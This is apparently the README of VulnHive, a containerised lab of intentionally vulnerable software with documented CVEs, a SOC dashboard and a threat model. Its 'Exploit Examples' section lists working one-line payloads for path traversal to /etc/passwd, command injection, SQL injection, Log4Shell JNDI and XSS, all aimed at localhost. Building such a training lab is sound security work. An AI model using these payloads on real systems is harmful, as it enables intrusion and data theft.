# VulnHive 🐝

![VulnHive SOC Terminal](dashboard.png)

## The Problem

Setting up local instances of vulnerable software or complex hacking frameworks (like Metasploitable) is often frustrating, bloated, and clunky. Security researchers, penetration testers, and developers who simply want to test their automated tools or hone their skills are forced to manage a chaotic web of dependencies, configure multiple virtual machines, and risk exposing their host environments to actual threats. 

VulnHive was built to solve this. It provides a lightweight, modular, and containerised suite of real-world software with documented CVEs. No "toy" vulnerabilities: just actual unpatched code running in a highly observable, isolated environment.

## The Solution

VulnHive leverages Docker Compose to instantly spin up specific vulnerable nodes. It includes a custom-built, real-time SOC (Security Operations Centre) terminal dashboard that monitors the internal Docker network, parsing logs to highlight successful exploitation attempts as they happen.

## Security & Threat Model

### Protective Measures
*   **Strict Local Binding:** All exposed services are explicitly bound to `127.0.0.1`. This ensures that even if your router has UPnP enabled or you are on a public Wi-Fi network, the vulnerable services cannot be accessed by external actors.
*   **Database Isolation:** The internal MariaDB database (used by the CMS nodes) is not exposed to the host machine at all. It exists purely within the internal Docker network.
*   **Containerised:** Exploits that result in Remote Code Execution (RCE) are restricted to the filesystem of the specific Docker container, providing a protective barrier for your host OS.

### ⚠️ Security Warning & Threat Model
Whilst significant steps have been taken to secure VulnHive for local use, it is a collection of **intentionally vulnerable software**. Users must understand the following risks:

1.  **Reverse Shells (Egress Risk):** Some services (specifically the CMS nodes) require internet access to pull resources or function correctly. Consequently, the containers have network egress. An attacker who achieves RCE can trigger a reverse shell connecting back to their own server on the internet.
2.  **Network Pivoting:** A compromised container could potentially be used as a "jump box" to scan or attack other devices on your local Wi-Fi or internal network.
3.  **Container Escapes:** Whilst rare, a sophisticated attacker could leverage a host kernel vulnerability to "escape" the Docker container and gain access to your physical host machine.

### Recommendation: Use a Virtual Machine
**It is strongly recommended to run VulnHive within a dedicated Virtual Machine (e.g. Kali Linux in VirtualBox or VMware).** This provides an additional layer of isolation (the "double-wall" approach), ensuring that even a total compromise of the VulnHive environment remains contained within the VM and cannot touch your primary host OS or network.

## OWASP Top 10 (2025) Mapping

The nodes within VulnHive map directly to the latest critical vulnerabilities:

| VulnHive Node | Vulnerability Type | Real-World Software | OWASP Category (2025) |
| :--- | :--- | :--- | :--- |
| **LFI / RCE** | Path Traversal | Apache 2.4.49 (CVE-2021-41773) | A01: Broken Access Control |
| **SSRF** | Request Forgery | osTicket 1.14.2 (CVE-2020-24881) | A01: Broken Access Control |
| **Security Misconfig**| Default Credentials | CMSimple 5.15 (Searchsploit 39271) | A02: Security Misconfiguration |
| **Outdated Component**| Log4Shell (RCE) | Log4j 2.14.1 (CVE-2021-44228) | A03: Software Supply Chain Failures |
| **Cryptographic**| Weak MD5 Hashing | SweetRice 1.5.1 (Searchsploit 4779) | A04: Cryptographic Failures |
| **SQLi** | SQL Injection | Cuppa CMS v1.0 (CVE-2022-24265) | A05: Injection |
| **Wonder XSS** | Cross-Site Scripting | WonderCMS 3.4.2 (CVE-2023-41425) | A05: Injection |
| **Atom RCE** | Command Injection | Atom CMS 2.0 (Searchsploit 50840)| A05: Injection |
| **Insecure Design**| IDOR / Broken Access | Bus Pass Management 1.0 (Searchsploit 50263)| A06: Insecure Design |
| **Auth Failure** | Pre-Auth RCE | Fuel CMS 1.4.1 (Searchsploit 47138)| A07: Authentication Failures |
| **PHP Backdoor** | Supply Chain Attack| PHP 8.1.0-dev | A08: Software and Data Integrity Failures |
| **Logging Failure** | Silent Backdoor | Custom Silent-Admin Node | A09: Security Logging & Alerting Failures |
| **Exceptional Cond.** | Info Leakage | Custom Error-Leaker Node | A10: Mishandling of Exceptional Conditions |

## Installation & Usage

### Prerequisites
*   [Docker](https://docs.docker.com/get-docker/)
*   [Docker Compose](https://docs.docker.com/compose/install/)
*   `python3` (For the SOC Terminal)

### Quick Start

1.  **Clone and Start:**
    ```bash
    git clone https://github.com/cycloarcane/VulnHive.git
    cd VulnHive
    ./run.sh
    ```

2.  **Select Targets:**
    Follow the interactive menu to spin up specific vulnerabilities. You can toggle individual nodes or select "ALL SERVICES".

3.  **Launch the SOC Terminal:**
    When prompted, type `y` to launch the Python-based SOC dashboard. This will automatically set up a virtual environment and start monitoring the live traffic feed.

### Exploit Examples

*   **LFI (Apache):** `http://127.0.0.1:54321/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
*   **RCE (Atom CMS):** `http://127.0.0.1:54322/index.php?cmd=id`
*   **SQLi (Cuppa CMS):** `http://127.0.0.1:54323/index.php?id=1'%20OR%201=1`
*   **Crypto (SweetRice):** `http://127.0.0.1:54330/inc/backup/`
*   **Log4j (Outdated):** `curl http://127.0.0.1:54331 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}'`
*   **XSS (WonderCMS):** `http://127.0.0.1:54324/?xss=<script>alert('VulnHive')</script>`
*   **PHP Backdoor:** `http://127.0.0.1:54325/?cmd=id`
*   **Exceptional (A10):** `http://127.0.0.1:54333/?crash=1` (Forces a leak in the stack trace)

## Roadmap

*   **AI/LLM Prompt Injection Node:** As AI integration becomes ubiquitous, a node specifically designed to test prompt injection and logic bypasses will be added to the hive.
*   **Container Hardening Options:** Introduce a "Zero Egress" mode for users who do not require external resource fetching, further mitigating reverse shell risks.
